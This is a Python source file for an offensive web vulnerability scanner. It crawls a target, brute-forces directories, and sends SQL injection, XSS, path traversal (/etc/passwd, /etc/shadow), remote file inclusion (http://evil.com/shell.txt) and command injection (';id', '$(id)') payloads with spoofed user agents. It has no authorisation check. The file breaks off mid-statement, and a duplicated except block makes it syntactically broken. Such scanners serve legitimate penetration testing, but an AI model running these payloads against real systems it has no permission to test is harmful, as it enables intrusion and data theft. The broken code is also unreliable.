#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, quote
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import os
import sys
import re
import argparse
import random
from colorama import Fore, Style, init
import json
import xml.etree.ElementTree as ET
import socket
import asyncio
import aiohttp
from functools import partial

# Initialize colorama
init(autoreset=True)

# Configuration
CONFIG = {
    "WORDLIST": {
        "DIRECTORY": "txt/directories.txt",
        "SQLI": "txt/hugeSQL.txt",
        "XSS": "txt/xss-payload-list.txt",
        "PARAMS": "txt/params.txt"
    },
    "THREADS": 50,
    "TIMEOUT": 10,
    "DELAY": 0,
    "USER_AGENTS": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
        "Mozilla/5.0 (Linux; Android 10; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
    ],
    "COLORS": {
        "info": Fore.BLUE,
        "success": Fore.GREEN,
        "warning": Fore.YELLOW,
        "error": Fore.RED,
        "critical": Fore.RED + Style.BRIGHT,
        "debug": Fore.CYAN
    },
    "BANNER": f"""{Fore.RED}
  _    _ _____ _____  ______ _____ _______       _   _ ______ _____  
 | |  | |_   _|  __ \|  ____|  __ \__   __|/\   | \ | |  ____|  __ \ 
 | |__| | | | | |__) | |__  | |__) | | |  /  \  |  \| | |__  | |__) |
 |  __  | | | |  ___/|  __| |  _  /  | | / /\ \ | . ` |  __| |  _  / 
 | |  | |_| |_| |    | |____| | \ \  | |/ ____ \| |\  | |____| | \ \ 
 |_|  |_|_____|_|    |______|_|  \_\ |_/_/    \_\_| \_|______|_|  \_\
{Style.RESET_ALL}"""
}


class WebScanner:
    def __init__(self, verbose=False, aggressive=False):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": random.choice(CONFIG["USER_AGENTS"]),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })
        self.verbose = verbose
        self.aggressive = aggressive
        self.color = CONFIG["COLORS"]
        self.vulnerabilities = []
        self.discovered_paths = []
        self.checked_urls = set()
        self.scanned_urls = set()  # Track all scanned URLs to prevent duplicates
        self.semaphore = asyncio.Semaphore(CONFIG["THREADS"])
        self.aiohttp_session = None
        self.seen_directories = set()  # Track seen directories to prevent duplicates

    def print_status(self, message, level="info"):
        color = self.color.get(level, Fore.WHITE)
        print(f"{color}[{level.upper()}] {message}{Style.RESET_ALL}")

    def random_user_agent(self):
        return random.choice(CONFIG["USER_AGENTS"])

    async def async_request(self, method, url, **kwargs):
        if not self.aiohttp_session:
            connector = aiohttp.TCPConnector(
                limit=0,
                limit_per_host=100,
                force_close=True,
                enable_cleanup_closed=True
            )
            self.aiohttp_session = aiohttp.ClientSession(
                connector=connector,
                timeout=aiohttp.ClientTimeout(total=CONFIG["TIMEOUT"]),
                trust_env=True
            )

        try:
            async with self.semaphore:
                async with self.aiohttp_session.request(
                    method, 
                    url, 
                    **kwargs
                ) as response:
                    text = await response.text()
                    return {
                        'status': response.status,
                        'text': text,
                        'headers': dict(response.headers),
                        'url': str(response.url)
                    }
        except Exception as e:
            if self.verbose:
                self.print_status(f"Request error: {e}", "error")
            return None
        
    def scan(self, url):
        print(CONFIG["BANNER"])
        
        # Normalize the URL - add https:// if no scheme is provided
        normalized_url = self.normalize_url(url)
        self.print_status(f"Starting scan for: {normalized_url}", "info")

        if not self.validate_url(normalized_url):
            self.print_status("Invalid URL format", "error")
            return

        # Check if URL contains /FUZZ/ and only run WFuzz if it does
        if "/FUZZ/" in normalized_url.upper():
            self.print_status("FUZZ pattern detected, running WFuzz only", "info")
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            
            try:
                loop.run_until_complete(self.run_wfuzz_only(normalized_url))
            except KeyboardInterrupt:
                self.print_status("Scan interrupted by user", "warning")
            finally:
                try:
                    if self.aiohttp_session:
                        loop.run_until_complete(self.aiohttp_session.close())
                    loop.close()
                except:
                    pass
            return

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        try:
            loop.run_until_complete(self.async_scan(normalized_url))
        except KeyboardInterrupt:
            self.print_status("Scan interrupted by user", "warning")
        except Exception as e:
            self.print_status(f"Scan error: {str(e)}", "error")
            if self.verbose:
                import traceback
                traceback.print_exc()
        finally:
            try:
                if self.aiohttp_session:
                    loop.run_until_complete(self.aiohttp_session.close())
                loop.close()
            except:
                pass

    def normalize_url(self, url):
        """Add https:// scheme if no scheme is provided"""
        if not url.startswith(('http://', 'https://')):
            # Try https first, fall back to http if https fails
            https_url = f"https://{url}"
            http_url = f"http://{url}"
            
            # Test which protocol works
            try:
                response = requests.head(https_url, timeout=5, allow_redirects=True, verify=False)
                return https_url
            except:
                try:
                    response = requests.head(http_url, timeout=5, allow_redirects=True, verify=False)
                    return http_url
                except:
                    # If both fail, default to https
                    return https_url
        return url

    async def async_scan(self, url):
        if not os.path.exists(CONFIG["WORDLIST"]["DIRECTORY"]):
            self.print_status(
                f"Wordlist not found at {CONFIG['WORDLIST']['DIRECTORY']}", "warning")
            self.print_status(
                "Using built-in common directories instead", "info")

        await self.crawl(url, max_depth=2)

        tests = [
            ("Basic Security Checks", self.run_basic_checks),
            ("Parameter Discovery", self.find_parameters),
            ("Advanced SQLi Scan", self.advanced_sqli_scan),
            ("Advanced XSS Scan", self.advanced_xss_scan),
            ("File Inclusion Checks", self.check_file_inclusion),
            ("Command Injection", self.check_command_injection),
            ("XXE Injection", self.check_xxe_injection),
            ("SSRF Checks", self.check_ssrf),
            ("Open Redirect Checks", self.check_open_redirect),
            ("API Testing", self.test_api_endpoints),
            # Use choice-based directory bruteforce to prevent duplicates
            ("Directory Bruteforce", self.run_bruteforce_choice)
        ]

        for name, test in tests:
            try:
                self.print_status(f"Starting {name}...", "info")
                if asyncio.iscoroutinefunction(test):
                    await test(url)
                else:
                    # Handle synchronous functions
                    result = test(url)
                    if asyncio.iscoroutine(result):
                        await result
            except Exception as e:
                self.print_status(f"{name} failed: {str(e)}", "error")
                if self.verbose:
                    import traceback
                    traceback.print_exc()

        self.generate_report(url)
        self.print_status("Scan completed!", "success")

    def validate_url(self, url):
        try:
            result = urlparse(url)
            return all([result.scheme, result.netloc])
        except:
            return False

    async def crawl(self, url, max_depth=2):
        self.print_status(f"Crawling {url} (max depth: {max_depth})", "info")
        await self._crawl(url, max_depth, current_depth=0)

    async def _crawl(self, url, max_depth, current_depth):
        if current_depth > max_depth or url in self.checked_urls:
            return

        self.checked_urls.add(url)

        try:
            await asyncio.sleep(random.uniform(0.1, 0.5))
            headers = {"User-Agent": self.random_user_agent()}
            response = await self.async_request('GET', url, headers=headers, timeout=CONFIG["TIMEOUT"])

            if not response:
                return
                
            content_type = response['headers'].get('Content-Type', '')
            if 'text/html' not in content_type:
                return

            soup = BeautifulSoup(response['text'], 'html.parser')

            tasks = []
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href.startswith(('javascript:', 'mailto:', 'tel:', '#')):
                    continue

                absolute_url = urljoin(url, href)
                parsed = urlparse(absolute_url)
                if parsed.query:
                    params = sorted([param.split('=')[0]
                                    for param in parsed.query.split('&')])
                    normalized_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{'&'.join(params)}"
                else:
                    normalized_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

                if normalized_url in self.checked_urls:
                    continue

                if normalized_url not in self.discovered_paths:
                    self.discovered_paths.append(normalized_url)
                    self.print_status(f"Discovered: {normalized_url}", "debug")

                # Create task for each URL to crawl
                task = asyncio.create_task(self._crawl(
                    normalized_url, max_depth, current_depth + 1))
                tasks.append(task)

            for form in soup.find_all('form'):
                form_action = form.get('action', '')
                if form_action:
                    absolute_url = urljoin(url, form_action)
                    if absolute_url not in self.discovered_paths:
                        self.discovered_paths.append(absolute_url)
                        self.print_status(
                            f"Discovered form action: {absolute_url}", "debug")

            # Wait for all tasks to complete
            if tasks:
                await asyncio.gather(*tasks)

        except Exception as e:
            if self.verbose:
                self.print_status(
                    f"Crawling error at {url}: {str(e)}", "error")

    async def run_basic_checks(self, url):
        checks = [
            ("HTTP Security Headers", self.test_headers),
            ("CSRF Protection", self.test_csrf),
            ("CORS Misconfigurations", self.test_cors),
            ("Clickjacking Protection", self.test_clickjacking),
            ("Cookie Security", self.test_cookies),
            ("HTTP Methods", self.test_http_methods),
            ("Information Disclosure", self.test_info_disclosure)
        ]

        for name, check in checks:
            try:
                self.print_status(f"Testing {name}...", "info")
                if asyncio.iscoroutinefunction(check):
                    await check(url)
                else:
                    # Handle synchronous functions
                    result = check(url)
                    if asyncio.iscoroutine(result):
                        await result
            except Exception as e:
                self.print_status(f"{name} check failed: {str(e)}", "error")

    async def run_wfuzz_only(self, url):
        """Run only WFuzz when FUZZ pattern is detected in URL"""
        # Keep the original URL with /FUZZ/ intact
        target_url = url
        
        wordlist = CONFIG["WORDLIST"]["DIRECTORY"]
        if not os.path.exists(wordlist):
            self.print_status(f"Directory wordlist not found at {wordlist}", "error")
            self.print_status("Using built-in common directories instead", "info")
            wordlist = "directories.txt"
        
        command = [
            "wfuzz",
            "-w", wordlist,
            "--hc", "404,403",
            target_url
        ]
        
        try:
            self.print_status(f"Running command: {' '.join(command)}", "debug")
            process = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Print WFuzz output in real-time
            while True:
                line = await process.stdout.readline()
                if not line:
                    break
                print(line.decode().strip())
            
            await process.wait()
            self.print_status("WFuzz scan completed", "success")
            sys.exit(0)  # This exits the entire script
                
        except Exception as e:
            self.print_status(f"WFuzz error: {str(e)}", "error")
            self.print_status("Falling back to Python brute forcer...", "info")
            await self.run_python_bruteforce(url.replace('/FUZZ/', ''), wordlist)

    async def run_bruteforce_choice(self, url):
        """Choose between WFuzz and Python bruteforce based on availability"""
        if self.check_wfuzz():
            self.print_status("Using WFuzz for directory bruteforce", "info")
            await self.run_wfuzz_scan(url)
        else:
            self.print_status("Using Python for directory bruteforce", "info")
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}"
            wordlist = CONFIG["WORDLIST"]["DIRECTORY"] if os.path.exists(CONFIG["WORDLIST"]["DIRECTORY"]) else None
            await self.run_python_bruteforce(base_url, wordlist)

    async def run_wfuzz_scan(self, url):
        """Run WFuzz as part of the full scan process"""
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        wordlist = CONFIG["WORDLIST"]["DIRECTORY"]
        if not os.path.exists(wordlist):
            self.print_status(f"Directory wordlist not found at {wordlist}", "error")
            self.print_status("Using built-in common directories instead", "info")
            wordlist = None
        
        # Create a URL with FUZZ at the end
        target_url = f"{base_url}/FUZZ/"
        
        command = [
            "wfuzz",
            "-w", wordlist if wordlist else "directories.txt",
            "--hc", "404,403",
            target_url
        ]
        
        try:
            self.print_status(f"Running WFuzz scan: {' '.join(command)}", "info")
            process = await asyncio.create_subprocess_exec(
                *command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            # Print WFuzz output in real-time
            while True:
                line = await process.stdout.readline()
                if not line:
                    break
                print(line.decode().strip())
            
            await process.wait()
            self.print_status("WFuzz scan completed", "success")
        except Exception as e:
            self.print_status(f"WFuzz scan error: {str(e)}", "error")
            self.print_status("Falling back to Python brute forcer...", "info")
            await self.run_python_bruteforce(base_url, wordlist)
            
            await process.wait()
            print("="*100)
            self.print_status("WFuzz scan completed", "success")
        except Exception as e:
            self.print_status(f"WFuzz scan error: {str(e)}", "error")
            self.print_status("Falling back to Python brute forcer...", "info")
            await self.run_python_bruteforce(base_url, wordlist)

    async def run_python_bruteforce(self, base_url, wordlist=None):
        self.print_status("Running directory bruteforce with Python", "info")

        if wordlist and os.path.exists(wordlist):
            with open(wordlist, 'r', errors='ignore') as f:
                dirs = [line.strip() for line in f if line.strip()]
        else:
            dirs = [
                "admin", "login", "wp-admin", "backup", "config", "api",
                "test", "dev", "console", "phpmyadmin", "dbadmin",
                "administrator", "manager", "secure", "private"
            ]

        print("\n" + "="*100)
        print(f"{'URL':<60}{'Response':<12}{'Size':<10}{'Title':<30}")
        print("="*100)

        found_results = False

        async def check_dir(directory):
            nonlocal found_results
            try:
                test_url = f"{base_url}/{directory}"
                
                # Skip if already scanned
                if directory in self.seen_directories:
                    return
                self.seen_directories.add(directory)
                
                await asyncio.sleep(random.uniform(0, CONFIG["DELAY"]))
                headers = {"User-Agent": self.random_user_agent()}
                response = await self.async_request('GET', test_url, headers=headers, timeout=CONFIG["TIMEOUT"])

                if not response or response['status'] in [404, 403]:
                    return

                found_results = True
                title = ""
                if 'text/html' in response['headers'].get('Content-Type', ''):
                    soup = BeautifulSoup(response['text'], 'html.parser')
                    if soup.title:
                        title = soup.title.string[:28] + "..." if len(
                            soup.title.string) > 30 else soup.title.string

                if response['status'] // 100 == 2:
                    status_color = Fore.GREEN
                elif response['status'] // 100 == 3:
                    status_color = Fore.BLUE
                elif response['status'] // 100 == 4:
                    status_color = Fore.YELLOW
                elif response['status'] // 100 == 5:
                    status_color = Fore.RED
                else:
                    status_color = Fore.WHITE

                print(
                    f"{test_url:<60}{status_color}{response['status']:<12}{Style.RESET_ALL}{len(response['text']):<10}{title:<30}")

                if test_url not in self.discovered_paths:
                    self.discovered_paths.append(test_url)
            except Exception as e:
                if self.verbose:
                    self.print_status(
                        f"Directory check error for {directory}: {e}", "error")

        tasks = []
        for directory in dirs:
            task = asyncio.create_task(check_dir(directory))
            tasks.append(task)
            if len(tasks) >= CONFIG["THREADS"]:
                await asyncio.gather(*tasks)
                tasks = []

        if tasks:
            await asyncio.gather(*tasks)

        if not found_results:
            self.print_status("No accessible directories found", "warning")

        print("="*100)

    def check_wfuzz(self):
        try:
            result = subprocess.run(["which", "wfuzz"],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE)
            return result.returncode == 0
        except:
            return False

    async def find_parameters(self, url):
        self.print_status("Discovering parameters...", "info")

        wordlist = CONFIG["WORDLIST"]["PARAMS"]
        if not os.path.exists(wordlist):
            self.print_status(
                f"Parameter wordlist not found at {wordlist}", "error")
            self.print_status(
                "Using built-in common parameters instead", "info")
            params = ["id", "page", "view", "file",
                      "search", "query", "user", "name"]
        else:
            with open(wordlist, 'r') as f:
                params = [line.strip() for line in f if line.strip()]

        vulnerable_params = []

        async def check_param(param):
            try:
                test_url = f"{url}?{param}=test"
                response = await self.async_request('GET', test_url, timeout=CONFIG["TIMEOUT"])

                if response and response['status'] == 200 and "test" in response['text']:
                    vulnerable_params.append(param)
                    self.print_status(f"Parameter found: {param}", "success")
            except Exception as e:
                if self.verbose:
                    self.print_status(
                        f"Parameter check error for {param}: {e}", "error")

        tasks = [check_param(param) for param in params]
        await asyncio.gather(*tasks)

        if vulnerable_params:
            self.print_status(
                f"Discovered parameters: {', '.join(vulnerable_params)}", "success")
        else:
            self.print_status("No parameters discovered", "warning")

        return vulnerable_params

    async def advanced_sqli_scan(self, url):
        self.print_status("Running advanced SQL injection tests...", "info")

        wordlist = CONFIG["WORDLIST"]["SQLI"]
        if os.path.exists(wordlist):
            with open(wordlist, 'r') as f:
                payloads = [line.strip() for line in f if line.strip()]
        else:
            payloads = [
                "'", "\"", "`", "'--", "\"--", "`--", "' OR '1'='1", "\" OR \"1\"=\"1",
                "' OR 1=1--", "\" OR 1=1--", "' OR 1=1#", "\" OR 1=1#", "' OR 1=1/*"
            ]

        vulnerable = False

        async def test_payload(payload):
            nonlocal vulnerable
            try:
                test_url = f"{url}?id={quote(payload)}"
                start_time = time.time()
                response = await self.async_request('GET', test_url, timeout=CONFIG["TIMEOUT"])
                response_time = time.time() - start_time

                if response and self.is_sqli_vulnerable(response, response_time):
                    self.print_status(
                        f"Possible SQLi (Payload: {payload})", "warning")
                    self.vulnerabilities.append({
                        "type": "SQL Injection",
                        "url": test_url,
                        "payload": payload,
                        "evidence": response['text'][:200] + "..." if len(response['text']) > 200 else response['text']
                    })
                    vulnerable = True
            except Exception as e:
                if self.verbose:
                    self.print_status(f"SQLi test error: {e}", "error")

        # Limit payloads unless aggressive mode
        test_payloads = payloads[:100] if not self.aggressive else payloads

        # Run tests with limited concurrency
        tasks = []
        for payload in test_payloads:
            task = asyncio.create_task(test_payload(payload))
            tasks.append(task)
            if len(tasks) >= CONFIG["THREADS"]:
                await asyncio.gather(*tasks)
                tasks = []

        if tasks:
            await asyncio.gather(*tasks)

        if not vulnerable:
            self.print_status(
                "No SQL injection vulnerabilities detected", "success")

    def is_sqli_vulnerable(self, response, response_time=None):
        error_indicators = [
            "SQL syntax", "MySQL server", "syntax error", "unclosed quotation mark",
            "ORA-", "Microsoft OLE DB Provider", "PostgreSQL", "SQLite", "JDBC",
            "ODBC", "DB2", "Sybase", "Unclosed quotation mark", "Warning: mysql",
            "SQL command not properly ended", "syntax error at or near",
            "Incorrect syntax near", "Query failed:", "SQL Server", "MySQL",
            "You have an error in your SQL syntax"
        ]

        if any(indicator.lower() in response['text'].lower() for indicator in error_indicators):
            return True

        if response_time and response_time > 5:
            return True

        if "error" in response['text'].lower() and "syntax" in response['text'].lower():
            return True

        return False

    async def advanced_xss_scan(self, url):
        self.print_status("Running advanced XSS tests...", "info")

        wordlist = CONFIG["WORDLIST"]["XSS"]
        if os.path.exists(wordlist):
            with open(wordlist, 'r') as f:
                payloads = [line.strip() for line in f if line.strip()]
        else:
            payloads = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                "javascript:alert(1)"
            ]

        vulnerable = False

        async def test_payload(payload):
            nonlocal vulnerable
            try:
                test_url = f"{url}?q={quote(payload)}"
                response = await self.async_request('GET', test_url, timeout=CONFIG["TIMEOUT"])

                if response and (payload in response['text'] or any(
                    decoded in response['text']
                    for decoded in [
                        payload.replace("<", "&lt;").replace(">", "&gt;"),
                        payload.replace("'", "&apos;").replace("\"", "&quot;"),
                        payload.replace("", "+")
                    ]
                )):
                    self.print_status(
                        f"Possible XSS (Payload: {payload})", "warning")
                    self.vulnerabilities.append({
                        "type": "XSS",
                        "url": test_url,
                        "payload": payload,
                        "evidence": response['text'][:200] + "..." if len(response['text']) > 200 else response['text']
                    })
                    vulnerable = True
            except Exception as e:
                if self.verbose:
                    self.print_status(f"XSS test error: {e}", "error")

        tasks = [test_payload(payload) for payload in payloads]
        await asyncio.gather(*tasks)

        if not vulnerable:
            self.print_status("No XSS vulnerabilities detected", "success")

    async def test_headers(self, url):
        try:
            response = await self.async_request('GET', url, timeout=CONFIG["TIMEOUT"])
            if not response:
                return

            headers = response['headers']

            security_headers = {
                'Content-Security-Policy': "Prevents XSS, clickjacking, and other code injection attacks",
                'X-Frame-Options': "Prevents clickjacking attacks",
                'X-Content-Type-Options': "Prevents MIME type sniffing",
                'Strict-Transport-Security': "Enforces HTTPS connections",
                'Referrer-Policy': "Controls referrer information in requests",
                'Permissions-Policy': "Controls browser features"
            }

            missing = []
            insecure = []

            for header, description in security_headers.items():
                if header not in headers:
                    missing.append(header)
                else:
                    value = headers[header].lower()
                    if header == 'X-Frame-Options' and value not in ['deny', 'sameorigin']:
                        insecure.append(
                            f"{header}: {headers[header]} (should be 'DENY' or 'SAMEORIGIN')"
                        )
                    elif header == 'X-Content-Type-Options' and value != 'nosniff':
                        insecure.append(
                            f"{header}: {headers[header]} (should be 'nosniff')"
                        )

            if missing:
                self.print_status(
                    f"Missing security headers: {', '.join(missing)}", "warning"
                )
                self.vulnerabilities.append({
                    "type": "Missing Security Headers",
                    "url": url,
                    "payload": None,
                    "evidence": f"Missing: {', '.join(missing)}"
                })

            if insecure:
                for issue in insecure:
                    self.print_status(
                        f"Insecure header configuration: {issue}", "warning"
                    )
                    self.vulnerabilities.append({
                        "type": "Insecure Security Header",
                        "url": url,
                        "payload": None,
                        "evidence": issue
                    })

            if not missing and not insecure:
                self.print_status(
                    "All security headers properly configured", "success"
                )
        except Exception as e:
            self.print_status(f"Header test error: {e}", "error")

    async def test_csrf(self, url):
        try:
            response = await self.async_request('GET', url, timeout=CONFIG["TIMEOUT"])
            if not response:
                return

            soup = BeautifulSoup(response['text'], 'html.parser')
            vulnerable_forms = []

            for form in soup.find_all('form'):
                csrf_protected = False

                if (form.find('input', {'name': 'csrf_token'}) or
                   form.find('input', {'name': '_token'}) or
                   form.find('input', {'name': 'authenticity_token'}) or
                   form.find('input', {'name': 'csrfmiddlewaretoken'})):
                    csrf_protected = True

                cookies = response['headers'].get('Set-Cookie', '')
                if 'SameSite=Strict' in cookies or 'SameSite=Lax' in cookies:
                    csrf_protected = True

                if not csrf_protected:
                    form_action = form.get('action', '')
                    if form_action:
                        form_url = urljoin(url, form_action)
                        vulnerable_forms.append(form_url)

            if vulnerable_forms:
                for form_url in vulnerable_forms:
                    self.print_status(
                        f"Possible CSRF vulnerability in form: {form_url}", "warning")
                    self.vulnerabilities.append({
                        "type": "CSRF",
                        "url": form_url,
                        "payload": None,
                        "evidence": "Missing CSRF token or SameSite cookie"
                    })
            else:
                self.print_status(
                    "CSRF protection mechanisms detected", "success")
        except Exception as e:
            self.print_status(f"CSRF test error: {e}", "error")

    async def test_cors(self, url):
        try:
            headers = {
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "GET",
                "Access-Control-Request-Headers": "X-Requested-With"
            }

            response = await self.async_request('OPTIONS', url, headers=headers, timeout=CONFIG["TIMEOUT"])
            if not response:
                return

            cors_headers = response['headers'].get(
                'Access-Control-Allow-Origin', '')
            cors_credentials = response['headers'].get(
                'Access-Control-Allow-Credentials', '')

            if cors_headers == "*":
                self.print_status(
                    "Insecure CORS configuration: Access-Control-Allow-Origin is *", "warning")
                self.vulnerabilities.append({
                    "type": "CORS Misconfiguration",
                    "url": url,
                    "payload": None,
                    "evidence": "Access-Control-Allow-Origin: *"
                })
            elif "evil.com" in cors_headers:
                self.print_status(
                    f"Dangerous CORS configuration: Access-Control-Allow-Origin reflects origin {cors_headers}", "critical")
                self.vulnerabilities.append({
                    "type": "CORS Misconfiguration",
                    "url": url,
                    "payload": None,
                    "evidence": f"Access-Control-Allow-Origin reflects origin: {cors_headers}"
                })
            elif cors_credentials == "true" and cors_headers != "null":
                self.print_status(
                    "Potentially dangerous CORS configuration: Allows credentials with origin restriction", "warning")
                self.vulnerabilities.append({
                    "type": "CORS Misconfiguration",
                    "url": url,
                    "payload": None,
                    "evidence": f"Access-Control-Allow-Credentials: true with origin: {cors_headers}"
                })
            else:
                self.print_status("CORS properly configured", "success")
        except Exception as e:
            self.print_status(f"CORS test error: {e}", "error")

    async def test_clickjacking(self, url):
        try:
            response = await self.async_request('GET', url, timeout=CONFIG["TIMEOUT"])
            if not response:
                return

            headers = response['headers']

            if 'X-Frame-Options' not in headers:
                self.print_status(
                    "Clickjacking possible - missing X-Frame-Options header", "warning")
                self.vulnerabilities.append({
                    "type": "Clickjacking",
                    "url": url,
                    "payload": None,
                    "evidence": "Missing X-Frame-Options header"
                })
            else:
                xfo = headers['X-Frame-Options'].lower()
                if xfo not in ['deny', 'sameorigin']:
                    self.print_status(
                        f"Potentially insecure X-Frame-Options value: {xfo}", "warning")
                    self.vulnerabilities.append({
                        "type": "Clickjacking",
                        "url": url,
                        "payload": None,
                        "evidence": f"Insecure X-Frame-Options value: {xfo}"
                    })
                else:
                    self.print_status(
                        "Clickjacking protection detected", "success")
        except Exception as e:
            self.print_status(f"Clickjacking test error: {e}", "error")

    async def test_cookies(self, url):
        try:
            response = await self.async_request('GET', url, timeout=CONFIG["TIMEOUT"])
            if not response:
                return

            cookies = response['headers'].get('Set-Cookie', '')

            issues = []

            if 'Secure' not in cookies:
                issues.append("Missing Secure flag")

            if 'HttpOnly' not in cookies:
                issues.append("Missing HttpOnly flag")

            if 'SameSite' not in cookies:
                issues.append("Missing SameSite attribute")
            elif 'SameSite=Lax' not in cookies and 'SameSite=Strict' not in cookies:
                issues.append("SameSite attribute not set to Lax or Strict")

            if issues:
                self.print_status(
                    f"Cookie security issues: {', '.join(issues)}", "warning")
                self.vulnerabilities.append({
                    "type": "Cookie Security",
                    "url": url,
                    "payload": None,
                    "evidence": f"Issues: {', '.join(issues)}"
                })
            else:
                self.print_status("Cookies properly secured", "success")
        except Exception as e:
            self.print_status(f"Cookie test error: {e}", "error")

    async def test_http_methods(self, url):
        try:
            methods = ['GET', 'POST', 'PUT', 'DELETE', 'TRACE', 'OPTIONS']
            allowed_methods = []

            for method in methods:
                try:
                    response = await self.async_request(method, url, timeout=CONFIG["TIMEOUT"])
                    if response and response['status'] != 405:
                        allowed_methods.append(method)
                except:
                    continue

            if 'TRACE' in allowed_methods:
                self.print_status(
                    "TRACE method enabled - potential XST vulnerability", "critical")
                self.vulnerabilities.append({
                    "type": "HTTP Method",
                    "url": url,
                    "payload": None,
                    "evidence": "TRACE method enabled"
                })

            if 'PUT' in allowed_methods or 'DELETE' in allowed_methods:
                self.print_status(
                    f"Potentially dangerous methods enabled: {', '.join(m for m in allowed_methods if m in ['PUT', 'DELETE'])}", "warning")
                self.vulnerabilities.append({
                    "type": "HTTP Method",
                    "url": url,
                    "payload": None,
                    "evidence": f"Dangerous methods enabled: {', '.join(m for m in allowed_methods if m in ['PUT', 'DELETE'])}"
                })

            self.print_status(
                f"Allowed HTTP methods: {', '.join(allowed_methods)}", "info")
        except Exception as e:
            self.print_status(f"HTTP methods test error: {e}", "error")

    async def test_info_disclosure(self, url):
        try:
            response = await self.async_request('GET', url, timeout=CONFIG["TIMEOUT"])
            if not response:
                return

            disclosures = []

            server = response['headers'].get('Server', '')
            if server:
                disclosures.append(f"Server header: {server}")

            powered_by = response['headers'].get('X-Powered-By', '')
            if powered_by:
                disclosures.append(f"X-Powered-By: {powered_by}")

            if '<!--' in response['text']:
                comments = re.findall(r'<!--(.*?)-->', response['text'])
                for comment in comments[:3]:
                    if any(word in comment.lower() for word in ['test', 'todo', 'fixme', 'password', 'secret']):
                        disclosures.append(
                            f"Sensitive comment: {comment[:100]}...")

            if 'sourceMappingURL' in response['text']:
                disclosures.append("JavaScript source maps found")

            common_files = [
                '/.git/HEAD', '/.env', '/package.json', '/composer.json',
                '/phpinfo.php', '/info.php', '/test.php', '/debug.php'
            ]

            async def check_file(file):
                test_url = urljoin(url, file)
                try:
                    file_response = await self.async_request('GET', test_url, timeout=CONFIG["TIMEOUT"])
                    if file_response and file_response['status'] == 200:
                        disclosures.append(f"Exposed file: {test_url}")
                except:
                    pass

            tasks = [check_file(file) for file in common_files]
            await asyncio.gather(*tasks)

            if disclosures:
                for disclosure in disclosures[:5]:
                    self.print_status(
                        f"Information disclosure: {disclosure}", "warning")
                    self.vulnerabilities.append({
                        "type": "Information Disclosure",
                        "url": url,
                        "payload": None,
                        "evidence": disclosure
                    })
            else:
                self.print_status(
                    "No obvious information disclosure detected", "success")
        except Exception as e:
            self.print_status(
                f"Information disclosure test error: {e}", "error")

    async def check_file_inclusion(self, url):
        self.print_status(
            "Testing for file inclusion vulnerabilities...", "info")

        payloads = [
            "../../../../etc/passwd",
            "../../../../etc/shadow",
            "../../../../windows/win.ini",
            "http://evil.com/shell.txt",
            "php://filter/convert.base64-encode/resource=index.php"
        ]

        vulnerable = False

        async def test_payload(payload):
            nonlocal vulnerable
            try:
                test_url = f"{url}?file={quote(payload)}"
                response = await self.async_request('GET', test_url, timeout=CONFIG["TIMEOUT"])

                if response and ("root:x:" in response['text'] or "[extensions]" in response['text'] or
                                 "<?php" in response['text'] or "Microsoft Corporation" in response['text']):
                    self.print_status(
                        f"Possible file inclusion (Payload: {payload})", "warning")
                    self.vulnerabilities.append({
                        "type": "File Inclusion",
                        "url": test_url,
                        "payload": payload,
                        "evidence": response['text'][:200] + "..." if len(response['text']) > 200 else response['text']
                    })
                    vulnerable = True

                test_url = urljoin(url, payload)
                response = await self.async_request('GET', test_url, timeout=CONFIG["TIMEOUT"])

                if response and ("root:x:" in response['text'] or "[extensions]" in response['text'] or
                                 "<?php" in response['text'] or "Microsoft Corporation" in response['text']):
                    self.print_status(
                        f"Possible file inclusion (Payload: {payload})", "warning")
                    self.vulnerabilities.append({
                        "type": "File Inclusion",
                        "url": test_url,
                        "payload": payload,
                        "evidence": response['text'][:200] + "..." if len(response['text']) > 200 else response['text']
                    })
                    vulnerable = True
            except Exception as e:
                if self.verbose:
                    self.print_status(
                        f"File inclusion test error: {e}", "error")

        tasks = [test_payload(payload) for payload in payloads]
        await asyncio.gather(*tasks)

        if not vulnerable:
            self.print_status(
                "No file inclusion vulnerabilities detected", "success")

    async def check_command_injection(self, url):
        self.print_status(
            "Testing for command injection vulnerabilities...", "info")

        payloads = [
            ";id",
            "|id",
            "||id",
            "&&id",
            "$(id)",
            "`id`",
            ";sleep 5"
        ]

        vulnerable = False

        async def test_payload(payload):
            nonlocal vulnerable
            try:
                test_url = f"{url}?cmd={quote(payload)}"
                start_time = time.time()
                response = await self.async_request('GET', test_url, timeout=CONFIG["TIMEOUT"])
                response_time = time.time() - start_time

                if response and ("uid=" in response['text'] or "gid=" in response['text'] or
